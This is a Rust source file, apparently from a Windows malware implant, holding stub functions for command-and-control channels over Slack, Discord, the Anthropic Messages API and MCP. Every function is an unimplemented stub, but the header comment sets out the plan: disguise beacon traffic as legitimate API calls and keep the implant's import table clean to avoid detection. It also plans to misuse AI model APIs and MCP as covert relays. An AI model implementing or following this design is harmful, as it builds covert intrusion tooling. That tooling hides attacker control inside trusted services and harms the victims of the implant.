//! External C2 channels — STUBS (spec-6 will implement).
//!
//! spec-6 plan: all external C2 channels use WinHTTP POST to third-party APIs
//! (Slack/Discord/Anthropic/MCP server), framing the beacon as legitimate API
//! traffic. Each service has its own message format (Slack chat.postMessage,
//! Discord webhook, Anthropic Messages API, MCP tools/call).
//!
//! These are "dual-use" — they can be WinHTTP-ized for PIC (no ureq/std needed),
//! keeping the implant's IAT clean while using HTTPS to legitimate domains.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Slack API external C2 — STUB. spec-6 fills this in.
pub unsafe fn slack_send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_SLACK_UNIMPL");
    None
}

/// LLM API (Anthropic) external C2 — STUB. spec-6 fills this in.
pub unsafe fn llm_send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_LLM_UNIMPL");
    None
}

/// MCP JSON-RPC external C2 — STUB. spec-6 fills this in.
pub unsafe fn mcp_send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_MCP_UNIMPL");
    None
}

/// Discord webhook/bot external C2 — STUB. spec-6 fills this in.
pub unsafe fn discord_send_recv(_ctx: &ChannelCtx, _frame: &[u8]) -> Option<Vec<u8>> {
    crate::entry::diag_mark(b"ERR_CH_DISCORD_UNIMPL");
    None
}
